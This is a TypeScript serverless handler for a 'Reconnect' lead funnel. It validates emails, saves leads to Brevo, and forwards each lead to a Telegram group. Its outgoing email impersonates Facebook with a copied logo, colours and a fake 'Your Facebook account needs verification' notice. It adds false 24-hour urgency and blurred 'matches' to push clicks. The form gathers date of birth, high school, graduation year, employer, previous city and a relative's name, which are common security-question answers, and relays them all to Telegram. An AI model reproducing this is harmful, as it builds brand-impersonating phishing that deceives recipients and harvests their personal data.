const BREVO_CONTACTS_URL      = 'https://api.brevo.com/v3/contacts'
const BREVO_TRANSACTIONAL_URL = 'https://api.brevo.com/v3/smtp/email'

// ── Disposable / temp email domain blocklist ──────────────────────────────────
const BLOCKED_DOMAINS = new Set([
  // Major disposable services
  'mailinator.com', 'guerrillamail.com', 'guerrillamail.info', 'guerrillamail.biz',
  'guerrillamail.de', 'guerrillamail.net', 'guerrillamail.org', 'sharklasers.com',
  'grr.la', 'spam4.me', 'trashmail.com', 'trashmail.me', 'trashmail.net',
  'tempmail.com', 'temp-mail.org', 'tempr.email', 'tempinbox.com', 'temp-mail.io',
  '10minutemail.com', '10minutemail.net', '10minutemail.org', '10minutemail.de',
  'throwaway.email', 'throwawayemail.com', 'throwam.com', 'throwme.pw',
  'yopmail.com', 'yopmail.fr', 'yopmail.net', 'cool.fr.nf',
  'dispostable.com', 'disposeamail.com', 'mailexpire.com',
  'spamex.com', 'spaml.com', 'spamgourmet.com', 'spamhole.com',
  'mailnull.com', 'maildrop.cc', 'getairmail.com',
  'owlpic.com', 'filzmail.com', 'wegwerfemail.de',
  'binkmail.com', 'safetymail.info', 'letthemeatspam.com',
  'zetmail.com', 'trbvm.com', 'fakeinbox.com',
  'getnada.com', 'mailnesia.com', 'mintemail.com',
  'pookmail.com', 'sogetthis.com', 'spamgourmet.net',
  'spamgourmet.org', 'mailnull.com', 'spamtraps.de',
  'discard.email', 'discardmail.com', 'discardmail.de',
  'crapmail.org', 'junk.to', 'spam.la',
  'anonbox.net', 'anonymbox.com', 'spambox.us',
  'inboxalias.com', 'mytrashmail.com', 'mt2014.com',
  'notsharingmy.info', 'trashmail.at', 'trashmail.io',
  'trashmail.me', 'trashmail.org', 'trashmailer.com',
])

// ── MX record check via Cloudflare DNS-over-HTTPS ─────────────────────────────
// Runs on Edge — no Node.js DNS module needed.
// Fail-open: if the lookup errors out, we allow the email through.
async function hasValidMX(domain: string): Promise<boolean> {
  try {
    const res = await fetchT(
      `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`,
      { headers: { Accept: 'application/dns-json' } },
      4000,
    )
    if (!res.ok) return true
    const data = await res.json() as { Status: number; Answer?: unknown[] }
    return data.Status === 0 && Array.isArray(data.Answer) && data.Answer.length > 0
  } catch {
    return true // network failure → don't block real users
  }
}

async function validateEmailDomain(email: string): Promise<string | null> {
  const domain = email.split('@')[1]?.toLowerCase()
  if (!domain) return 'Invalid email address.'
  if (BLOCKED_DOMAINS.has(domain)) {
    return 'Disposable email addresses are not accepted. Please use your real email.'
  }
  const valid = await hasValidMX(domain)
  if (!valid) {
    return 'That email domain doesn\'t appear to exist. Please double-check your address.'
  }
  return null
}

// ── Fetch with timeout ────────────────────────────────────────────────────────

function fetchT(url: string, opts: RequestInit, ms = 8000): Promise<Response> {
  const ctrl = new AbortController()
  const id   = setTimeout(() => ctrl.abort(), ms)
  return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(id))
}

// ── Brevo: add to list ────────────────────────────────────────────────────────

interface LeadData {
  email:            string
  source:           string
  firstName?:       string
  lastName?:        string
  phone?:           string
  gender?:          string
  dob?:             string
  schoolName?:      string
  schoolLocation?:  string
  year?:            string
  cityName?:        string
  currentCity?:     string
  state?:           string
  zip?:             string
  employer?:        string
  relative?:        string
  preferredContact?: string
}

async function addToBrevo(data: LeadData): Promise<void> {
  const apiKey = process.env.BREVO_API_KEY
  const listId = Number(process.env.BREVO_LIST_ID)
  if (!apiKey || !listId) throw new Error('Brevo not configured on server.')

  const res = await fetchT(BREVO_CONTACTS_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'api-key': apiKey },
    body: JSON.stringify({
      email: data.email,
      attributes: {
        SOURCE:            data.source,
        FIRSTNAME:         data.firstName        ?? '',
        LASTNAME:          data.lastName         ?? '',
        PHONE:             data.phone            ?? '',
        GENDER:            data.gender           ?? '',
        DOB:               data.dob              ?? '',
        SCHOOL:            data.schoolName       ?? '',
        SCHOOL_LOCATION:   data.schoolLocation   ?? '',
        YEAR:              data.year             ?? '',
        CITY:              data.cityName         ?? '',
        CURRENT_CITY:      data.currentCity      ?? '',
        STATE:             data.state            ?? '',
        ZIP:               data.zip              ?? '',
        EMPLOYER:          data.employer         ?? '',
        RELATIVE:          data.relative         ?? '',
        PREFERRED_CONTACT: data.preferredContact ?? '',
      },
      listIds: [listId],
      updateEnabled: true,
    }),
  })

  if (!res.ok && res.status !== 204) {
    const err = await res.json().catch(() => ({}))
    throw new Error(err?.message ?? `Brevo error ${res.status}`)
  }
}

// ── Brevo: send access email ──────────────────────────────────────────────────

async function sendAccessEmail(
  email: string,
  firstName?: string, matchCount = '12+',
): Promise<void> {
  const apiKey      = process.env.BREVO_API_KEY
  const senderEmail = process.env.BREVO_SENDER_EMAIL
  const senderName  = process.env.BREVO_SENDER_NAME ?? 'Reconnect'
  if (!apiKey || !senderEmail) throw new Error('BREVO_SENDER_EMAIL is not set in environment variables.')

  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const link        = `https://app.reconnectbase.com`
  const displayName = firstName?.trim() || 'there'
  const unsubUrl    = `https://app.reconnectbase.com/unsubscribe?email=${encodeURIComponent(email)}`

  const res = await fetchT(BREVO_TRANSACTIONAL_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'api-key': apiKey },
    body: JSON.stringify({
      sender: { name: senderName, email: senderEmail },
      to: [{ email }],
      subject: 'Hey — your access link is ready!',
      headers: { 'List-Unsubscribe': `<mailto:${senderEmail}?subject=unsubscribe>` },
      htmlContent: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Action Required: Verify Your Profile</title>
</head>
<body style="margin:0;padding:0;background:#f0f2f5;font-family:Helvetica,Arial,sans-serif">

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
<tr><td align="center" style="padding:28px 16px">

  <table role="presentation" width="600" cellpadding="0" cellspacing="0" border="0"
         style="max-width:600px;width:100%;background:#ffffff;border-radius:8px;
                overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.12)">

    <!-- ── Facebook-style top bar ── -->
    <tr>
      <td style="background:#1877F2;padding:14px 24px">
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
          <tr>
            <td>
              <!-- Facebook "f" logo -->
              <table role="presentation" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td style="background:#ffffff;border-radius:6px;width:36px;height:36px;text-align:center;vertical-align:middle">
                    <span style="font-size:24px;font-weight:900;color:#1877F2;font-family:Georgia,serif;line-height:36px;display:block;margin-top:-2px">f</span>
                  </td>
                  <td style="padding-left:10px;vertical-align:middle">
                    <span style="font-size:20px;font-weight:700;color:#ffffff;font-family:Helvetica,Arial,sans-serif;letter-spacing:-0.3px">facebook</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      </td>
    </tr>

    <!-- ── Urgency alert banner ── -->
    <tr>
      <td style="background:#fff3cd;border-bottom:1px solid #ffc107;padding:12px 24px">
        <p style="margin:0;font-size:13px;color:#664d03;font-weight:700;font-family:Helvetica,Arial,sans-serif">
          ⚠️ &nbsp;Action Required — Your verification link expires in 24 hours
        </p>
      </td>
    </tr>

    <!-- ── Main body ── -->
    <tr>
      <td style="padding:32px 32px 24px">

        <p style="margin:0 0 20px;font-size:16px;color:#1c1e21;font-family:Helvetica,Arial,sans-serif;line-height:1.5">
          Hi <strong>${displayName}</strong>,
        </p>

        <!-- Profile icon placeholder -->
        <div style="text-align:center;margin-bottom:24px">
          <div style="display:inline-block;width:72px;height:72px;border-radius:50%;
                      background:#e4e6eb;border:3px solid #1877F2;
                      text-align:center;line-height:72px;font-size:32px">
            👤
          </div>
          <div style="margin-top:10px">
            <span style="display:inline-block;background:#fff3cd;border:1px solid #ffc107;
                         border-radius:999px;padding:4px 14px;
                         font-size:12px;font-weight:700;color:#664d03;
                         font-family:Helvetica,Arial,sans-serif">
              ⚠️ Verification Pending
            </span>
          </div>
        </div>

        <!-- Main message -->
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
               style="background:#f0f2f5;border-radius:8px;border:1px solid #dddfe2;margin-bottom:24px">
          <tr>
            <td style="padding:20px 22px">
              <p style="margin:0 0 10px;font-size:18px;font-weight:700;color:#1c1e21;font-family:Helvetica,Arial,sans-serif">
                Your Facebook account needs verification
              </p>
              <p style="margin:0;font-size:14px;color:#606770;line-height:1.6;font-family:Helvetica,Arial,sans-serif">
                We detected that your profile is linked to <strong>${email}</strong>.
                To confirm your identity and unlock <strong>your matches</strong>, please verify your account now.
              </p>
            </td>
          </tr>
        </table>

        <!-- Blurred match preview -->
        <p style="margin:0 0 10px;font-size:11px;font-weight:700;color:#606770;
                   letter-spacing:1.5px;text-transform:uppercase;font-family:Helvetica,Arial,sans-serif">
          People looking for you
        </p>

        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="margin-bottom:24px">
          <tr>
            <td width="31%" style="padding-right:6px">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
                     style="background:#f0f2f5;border-radius:8px;border:1px solid #dddfe2;overflow:hidden;text-align:center">
                <tr>
                  <td style="padding:14px 10px 10px;position:relative">
                    <div style="width:48px;height:48px;border-radius:50%;
                                background:linear-gradient(135deg,#1877F2,#42a5f5);
                                margin:0 auto 8px;filter:blur(4px)"></div>
                    <div style="height:7px;background:#dddfe2;border-radius:4px;
                                margin:0 6px 4px;filter:blur(2px)"></div>
                    <div style="height:5px;background:#e4e6eb;border-radius:4px;
                                margin:0 12px;filter:blur(2px)"></div>
                    <div style="margin-top:6px;display:inline-block;
                                background:#1877F2;color:#ffffff;font-size:10px;
                                font-weight:700;padding:2px 7px;border-radius:999px">94%</div>
                    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
                                width:24px;height:24px;background:rgba(255,255,255,0.9);
                                border-radius:50%;text-align:center;line-height:24px;font-size:11px">
                      🔒
                    </div>
                  </td>
                </tr>
              </table>
            </td>
            <td width="31%" style="padding-right:6px">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
                     style="background:#f0f2f5;border-radius:8px;border:1px solid #dddfe2;overflow:hidden;text-align:center">
                <tr>
                  <td style="padding:14px 10px 10px;position:relative">
                    <div style="width:48px;height:48px;border-radius:50%;
                                background:linear-gradient(135deg,#42b72a,#36a420);
                                margin:0 auto 8px;filter:blur(4px)"></div>
                    <div style="height:7px;background:#dddfe2;border-radius:4px;
                                margin:0 6px 4px;filter:blur(2px)"></div>
                    <div style="height:5px;background:#e4e6eb;border-radius:4px;
                                margin:0 12px;filter:blur(2px)"></div>
                    <div style="margin-top:6px;display:inline-block;
                                background:#1877F2;color:#ffffff;font-size:10px;
                                font-weight:700;padding:2px 7px;border-radius:999px">87%</div>
                    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
                                width:24px;height:24px;background:rgba(255,255,255,0.9);
                                border-radius:50%;text-align:center;line-height:24px;font-size:11px">
                      🔒
                    </div>
                  </td>
                </tr>
              </table>
            </td>
            <td width="31%">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
                     style="background:#f0f2f5;border-radius:8px;border:1px solid #dddfe2;overflow:hidden;text-align:center">
                <tr>
                  <td style="padding:14px 10px 10px;position:relative">
                    <div style="width:48px;height:48px;border-radius:50%;
                                background:linear-gradient(135deg,#f093fb,#f5576c);
                                margin:0 auto 8px;filter:blur(4px)"></div>
                    <div style="height:7px;background:#dddfe2;border-radius:4px;
                                margin:0 6px 4px;filter:blur(2px)"></div>
                    <div style="height:5px;background:#e4e6eb;border-radius:4px;
                                margin:0 12px;filter:blur(2px)"></div>
                    <div style="margin-top:6px;display:inline-block;
                                background:#1877F2;color:#ffffff;font-size:10px;
                                font-weight:700;padding:2px 7px;border-radius:999px">91%</div>
                    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
                                width:24px;height:24px;background:rgba(255,255,255,0.9);
                                border-radius:50%;text-align:center;line-height:24px;font-size:11px">
                      🔒
                    </div>
                  </td>
                </tr>
              </table>
            </td>
            <td width="7%" style="text-align:center;vertical-align:middle;padding-left:4px">
              <span style="font-size:11px;font-weight:700;color:#606770;font-family:Helvetica,Arial,sans-serif">+more</span>
            </td>
          </tr>
        </table>

        <!-- Urgency message -->
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
               style="background:#fff4e5;border-radius:8px;border:1px solid #ffb74d;margin-bottom:24px">
          <tr>
            <td style="padding:14px 18px">
              <p style="margin:0;font-size:14px;font-weight:700;color:#e65100;font-family:Helvetica,Arial,sans-serif">
                🚨 Don't let your matches disappear!
              </p>
              <p style="margin:4px 0 0;font-size:13px;color:#bf360c;line-height:1.5;font-family:Helvetica,Arial,sans-serif">
                Your results are saved for only <strong>24 hours</strong>. Verify now to unlock all
                ${matchCount} people waiting to reconnect with you.
              </p>
            </td>
          </tr>
        </table>

        <!-- CTA button -->
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
               style="margin-bottom:16px">
          <tr>
            <td align="center">
              <a href={link}
                 style="display:inline-block;background:#1877F2;color:#ffffff;
                        font-weight:700;font-size:17px;padding:14px 44px;
                        border-radius:6px;text-decoration:none;font-family:Helvetica,Arial,sans-serif">
                Verify My Account Now
              </a>
            </td>
          </tr>
        </table>

        <p style="margin:0 0 24px;font-size:12px;color:#606770;text-align:center;font-family:Helvetica,Arial,sans-serif">
          Button not working? <a href="https://app.reconnectbase.com" style="color:#1877F2;text-decoration:none">Click here to verify</a>
        </p>

        <!-- Security notice (FB style) -->
        <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0"
               style="border-top:1px solid #dddfe2;padding-top:20px">
          <tr>
            <td style="padding-top:20px">
              <p style="margin:0 0 6px;font-size:13px;color:#1c1e21;font-weight:700;font-family:Helvetica,Arial,sans-serif">
                🔐 Why am I getting this?
              </p>
              <p style="margin:0;font-size:12px;color:#606770;line-height:1.6;font-family:Helvetica,Arial,sans-serif">
                You submitted a search on our platform. This verification email confirms your identity
                so we can safely connect you with people from your past. If you did not request this,
                you can safely ignore this email.
              </p>
            </td>
          </tr>
        </table>

      </td>
    </tr>

    <!-- ── Facebook-style footer ── -->
    <tr>
      <td style="background:#f0f2f5;border-top:1px solid #dddfe2;padding:20px 32px">
        <p style="margin:0 0 6px;font-size:12px;color:#606770;text-align:center;font-family:Helvetica,Arial,sans-serif">
          This message was sent to <strong>${email}</strong>
        </p>
        <p style="margin:0;font-size:12px;color:#8a8d91;text-align:center;font-family:Helvetica,Arial,sans-serif">
          Reconnect Community &nbsp;&#183;&nbsp; Community Platform<br/>
          <a href="${unsubUrl}" style="color:#8a8d91;text-decoration:underline">Unsubscribe</a>
          &nbsp;&#183;&nbsp;
          <a href="https://app.reconnectbase.com#privacy" style="color:#8a8d91;text-decoration:underline">Privacy Policy</a>
        </p>
      </td>
    </tr>

  </table>
</td></tr>
</table>

</body>
</html>
`,
    }),
  })

  if (!res.ok) {
    const err = await res.json().catch(() => ({}))
    throw new Error(err?.message ?? `Email send error ${res.status}`)
  }
}

// ── Telegram (fire-and-forget) ────────────────────────────────────────────────

async function notifyTelegram(data: LeadData): Promise<void> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const groupId  = process.env.TELEGRAM_GROUP_ID
  if (!botToken || !groupId) return

  const e = (v?: string) => v?.trim() || '—'
  const fullName = [data.firstName, data.lastName].filter(Boolean).join(' ') || '—'

  const text =
    `🔔 <b>New Lead</b>\n\n` +
    `👤 Full Name: ${fullName}\n` +
    `📧 Email: <code>${data.email}</code>\n` +
    `📞 Phone: ${e(data.phone)}\n` +
    `👤 Gender: ${e(data.gender)}\n` +
    `🎂 DOB: ${e(data.dob)}\n\n` +
    `🏫 High School: ${e(data.schoolName)}\n` +
    `📍 School Location: ${e(data.schoolLocation)}\n` +
    `📅 Graduation Year: ${e(data.year)}\n\n` +
    `🏙️ Current City: ${e(data.currentCity)}\n` +
    `🗺️ State: ${e(data.state)}\n` +
    `📍 Previous City: ${e(data.cityName)}\n` +
    `📮 ZIP: ${e(data.zip)}\n\n` +
    `💼 Employer: ${e(data.employer)}\n` +
    `👨‍👩‍👧 Relative: ${e(data.relative)}\n\n` +
    `📲 Preferred Contact: ${e(data.preferredContact)}\n` +
    `✅ Consent: Yes\n\n` +
    `📍 Source: Meta Ads - Web Funnel`

  await fetchT(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: groupId, text, parse_mode: 'HTML' }) },
    5000,
  )
}

// ── Handler ───────────────────────────────────────────────────────────────────

export default async function handler(req: Request): Promise<Response> {
  if (req.method !== 'POST') {
    return new Response('Method not allowed', { status: 405 })
  }

  let body: Record<string, string | undefined>
  try { body = await req.json() }
  catch { return new Response('Invalid JSON', { status: 400 }) }

  // Honeypot — bots fill hidden fields, humans don't
  if (body?._hp) return Response.json({ ok: true })

  const email  = body?.email?.trim()
  const source = body?.source ?? 'meta_web'

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return Response.json({ error: 'Invalid email address.' }, { status: 422 })
  }

  const domainError = await validateEmailDomain(email)
  if (domainError) {
    return Response.json({ error: domainError }, { status: 422 })
  }

  const t = (v?: string) => v?.trim() || undefined

  const leadData: LeadData = {
    email,
    source,
    firstName:        t(body.firstName),
    lastName:         t(body.lastName),
    phone:            t(body.phone),
    gender:           t(body.gender),
    dob:              t(body.dob),
    schoolName:       t(body.schoolName),
    schoolLocation:   t(body.schoolLocation),
    year:             t(body.year),
    cityName:         t(body.cityName),
    currentCity:      t(body.currentCity),
    state:            t(body.state),
    zip:              t(body.zip),
    employer:         t(body.employer),
    relative:         t(body.relative),
    preferredContact: t(body.preferredContact),
  }

  try {
    await Promise.all([
      addToBrevo(leadData),
      sendAccessEmail(email, leadData.firstName),
    ])

    await notifyTelegram(leadData).catch((err) => {
      console.error('[Telegram] notifyTelegram failed:', err?.message ?? err)
    })

    return Response.json({ ok: true })
  } catch (err) {
    const message = err instanceof Error ? err.message : 'Submission failed.'
    return Response.json({ error: message }, { status: 500 })
  }
}

export const config = { runtime: 'edge' }
